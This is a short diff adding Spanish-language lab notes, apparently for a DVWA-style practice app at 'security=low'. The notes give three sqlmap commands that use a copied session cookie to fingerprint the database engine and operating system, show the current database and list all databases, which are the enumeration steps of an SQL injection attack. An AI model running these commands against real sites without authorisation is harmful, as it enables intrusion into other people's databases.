@@ -1,1 +1,8 @@
-
+++ Terminal:
+--- sqlmap -u <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' --banner
+---- Se mostrará información referente a la base de datos como el motor 
+y el sistema operativo
+--- sqlmap -u <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' --banner --current-db
+---- Se mostrará la base de datos actual que se está usando
+--- sqlmap -u <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' --banner --current-db --dbs
+---- Se mostrara un listado de todas las bases de datos disponibles
